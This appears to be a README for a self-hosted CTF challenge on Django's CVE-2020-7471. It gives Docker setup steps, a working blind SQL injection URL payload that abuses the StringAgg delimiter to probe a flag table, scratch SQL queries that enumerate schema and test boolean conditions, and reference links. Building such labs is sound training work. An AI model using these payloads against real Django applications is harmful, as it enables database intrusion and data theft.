# CTF_CVE-2020-7471


## How to Start App
---
1. Build Docker image
```
make build
```
2. Up Docker Image
```
make up
```
3. Check Web Site
* [127.0.0.1:8000](http://127.0.0.1:8000/vul/1/).

## Payload
---
```
http://127.0.0.1:8000/vul/1/?content=-\') AS "mydefinedname" FROM "vul_blog" WHERE 1=1 AND case when (SELECT length(string_agg(vul_flag.flag, '')) FROM vul_flag) > 20 then true else false end GROUP BY "vul_blog"."title" LIMIT 1 offset 1 --
```

## Query
---
```
/*
SELECT datname FROM pg_database;
select * from pg_tables;

select * from information_schema.tables;


select column_name,data_type 
from information_schema.columns 
where table_name = 'vul_blog';

SELECT "vul_blog"."title", STRING_AGG("vul_blog"."content", '-') AS "mydefinedname" FROM "vul_blog" WHERE 1=1 OR 1=2 GROUP BY "vul_blog"."title" LIMIT 2 offset 1 --') AS "mydefinedname" FROM "vul_blog" GROUP BY "vul_blog"."title" LIMIT 2

SELECT "vul_blog"."title", STRING_AGG("vul_blog"."content", '') AS "mydefinedname" FROM "vul_blog" WHERE 1=1 AND 1=2 GROUP BY "vul_blog"."title" LIMIT 21

select flag, length(flag) from vul_flag where 1=1 AND if(length());

select case when length(select flag from vul_flag limit 1) < 10 then 'w' else '메롱' end;



select '1' as "wow", Exists (select flag from vul_flag);
select case when length(flag) > 10 then true else false end as tmp from vul_flag;



SELECT "vul_blog"."title", STRING_AGG("vul_blog"."content", '') AS "mydefinedname" FROM "vul_blog" WHERE 1=1 AND case when length(title) > 10 then true else false end GROUP BY "vul_blog"."title" LIMIT 21


select title, string_agg('vul_flag', 'flag','') from vul_blog;

select (SELECT length(string_agg(vul_flag.flag, ''))FROM vul_flag);
*/
SELECT "vul_blog"."title", STRING_AGG("vul_blog"."content", '') AS "mydefinedname" FROM "vul_blog" WHERE 1=1 AND case when (SELECT length(string_agg(vul_flag.flag, '')) FROM vul_flag) > 12 then true else false end GROUP BY "vul_blog"."title" LIMIT 21

/*
'SELECT "vul_blog"."title", STRING_AGG("vul_blog"."content", \'-\') AS "mydefinedname" FROM "vul_blog" GROUP BY "vul_blog"."title" LIMIT 2 offset 1 -- \') AS "mydefinedname" FROM "vul_blog" GROUP BY "vul_blog"."title" LIMIT 21'
*/
```


## Reference 
---

* [Link](https://github.com/Saferman/CVE-2020-7471).

* [NSFOCUS](https://nsfocusglobal.com/django-sql-injection-cve-2020-7471-threat-alert/).

* [Django Security](https://docs.djangoproject.com/ko/2.1/topics/security/).

* [Django Offical Document] (https://www.djangoproject.com/weblog/2020/feb/03/security-releases/).

* [Django Release History] (https://docs.djangoproject.com/en/3.0/releases/security/#february-3-2020-cve-2020-7471).


## 문제출제시 
1. 장고 버전정보와(3.0.1) postgresql을 사용한다는것은 공개해야됨
2. CVE정보를 공개할지는 고려해봐야함